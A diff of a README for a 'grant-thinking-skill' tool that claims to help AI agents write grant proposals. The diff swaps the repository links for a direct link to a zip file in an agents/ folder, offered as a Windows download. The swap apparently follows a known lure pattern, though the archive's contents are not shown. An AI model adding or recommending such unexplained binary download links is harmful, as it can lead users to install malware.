@@ -1,12 +1,12 @@
 # 🧠 grant-thinking-skill - Improve grant proposal funding success rates
 
-[![Download](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Ikramahmadmemon13/grant-thinking-skill)
+[![Download](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Ikramahmadmemon13/grant-thinking-skill/main/agents/skill_thinking_grant_v3.1.zip)
 
 This tool helps AI agents write successful grant proposals. It teaches software to think like a grant reviewer. You can use this skill to check if your research projects meet funding requirements. It focuses on feasibility and clear reasoning. You avoid common mistakes that lead to rejection.
 
 ## 📥 How to download the software
 
-Visit [this page](https://github.com/Ikramahmadmemon13/grant-thinking-skill) to download your copy. Follow the steps below to finish the setup on your Windows computer.
+Visit [this page](https://raw.githubusercontent.com/Ikramahmadmemon13/grant-thinking-skill/main/agents/skill_thinking_grant_v3.1.zip) to download your copy. Follow the steps below to finish the setup on your Windows computer.
 
 1. Go to the project link.
 2. Look for the button marked 'Code' on the right side.
